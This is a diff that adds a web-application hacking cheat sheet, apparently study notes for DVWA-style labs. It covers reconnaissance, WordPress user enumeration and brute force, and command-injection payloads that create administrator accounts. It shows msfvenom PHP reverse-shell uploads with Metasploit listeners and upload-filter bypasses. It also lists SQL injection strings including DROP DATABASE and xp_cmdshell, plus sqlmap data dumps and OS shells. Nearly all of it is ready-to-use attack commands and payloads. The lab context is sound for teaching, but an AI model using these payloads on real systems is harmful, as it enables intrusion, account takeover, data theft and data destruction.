@@ -1,0 +1,92 @@
+Hacking Web Applications
+
+1. Reconnaissance:
+i. Nmap - nmap -T4 -A -v <<domain name>>
+ Telnet - telnet <<domain name> 80
+GET / HTTP/1.0 #Press enter two times.
+
+ii. whatweb -v <<domain name>>  #IP Address,HTTP Headers information, Plugin Information
+iii. OWASP Zap -  #Automated Scanning And Spidering.
+iv. dig <<domain name>>  #check is target domain resolving multiple IP Address.
+lbd <<domain name>>  #HTTP and DNS Load Balancing Detector.
+
+v. nmap --script=http-enum -sV <<domain name>>
+gobuster dir -u <<domain name>> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+dirsearch
+
+vi. Vega #scanning
+vii.ClickjackPOC #Detect Clickjacking.
+python3 clickjackpoc.py -f <<Domain Name>>  #CHECK IN clickjackpoc/domainname.html file.
+
+2. Hacking
+1. PWNXSS #Detect XSS
+python3 pwnxss.py -u <<domain name>>
+
+WPSCAN - 
+wpscan --url <<domain name> -e vt -e vp -e u  #Enumerate username
+wpscan --api-token <<api-token>> --url <<domain name> -e vt -e vp -e u --plugins-detection aggressive
+Metasploit - scanner/http/wordpress_login_enum  #Brute-Force Password of the enumerated user.
+
+Command Injection 
+| whoami, | hostname, | tasklist, |Taskkill /PID 3112 /F,  |net user Test /Add, net localgroup Administrators Test /Add , email=x||ping+-c+10+127.0.0.1||
+Seperators
+&  &&  |   ||  ;   Newline (0x0a or \n)
+
+File Upload Vulnerability
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw | create a raw php code
+Copy the code in a text file and save as .php
+
+Low Level Exploitation
+Upload the file | note the path /dvwa/hackable/uploads/.php
+Run listener by starting msfconsole
+Type use exploit/multi/handler
+Type set payload php/meterpreter/reverse_tcp
+Type set LHOST 10.10.10.11
+Start listener, type exploit Browse link of file to start meterpreter session.
+
+
+Medium Level Exploitation
+Rename file as .php.jpg
+While uploading, intercepting with burp and rename back to .php
+Run listener by starting msfconsole
+Type use exploit/multi/handler
+Type set payload php/meterpreter/reverse_tcp
+Type set LHOST 10.10.10.11
+Start listener, type exploit
+Browse link of file to start meterpreter session.
+
+
+High Level Exploitation
+Open the .php file and add code GIF98 at start and save file as .jpg
+Upload file
+command execution tab and use command
+<Some IP>||copy C:\wamp64\www\DVWA\hackable\uploads<filename>.jpg C:\wamp64\www\DVWA\hackable\uploads\shell.php
+Run listener by starting msfconsole
+Type use exploit/multi/handler
+Type set payload php/meterpreter/reverse_tcp
+Type set LHOST 10.10.10.11 Start listener, type exploit
+Browse link of file to start meterpreter session.
+
+N-Stalker Web Application Security Scanner.
+
+SQL Injection
+
+Manual 
+
+abc' or 1-1--
+administrator'--
+abc';insert into login values('abc','abc123');--
+abc';create database abc;--
+abc';DROP DATABASE abc;--
+blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
+
+SQLMAP
+sqlmap -u "<<domain name>>" --cookie="<<cookievalue>>" --dbs
+sqlmap -u "<<domain name>>" --cookie="<<cookievalue>>" -D <<database-name>> --tables
+sqlmap -u "<<domain name>>" --cookie="<<cookievalue>>" -D <<database-name>> -T <<table-name>> --dump
+sqlmap -u "<<domain name>>" --cookie="<<cookievalue>>" --os-shell
+sqlmap -r file1.txt --dbs
+
+DSSS - SQL Injection Detection.
+python3 dsss.py -u "<<domain name>>" --cookie="<<cookievalue>>"
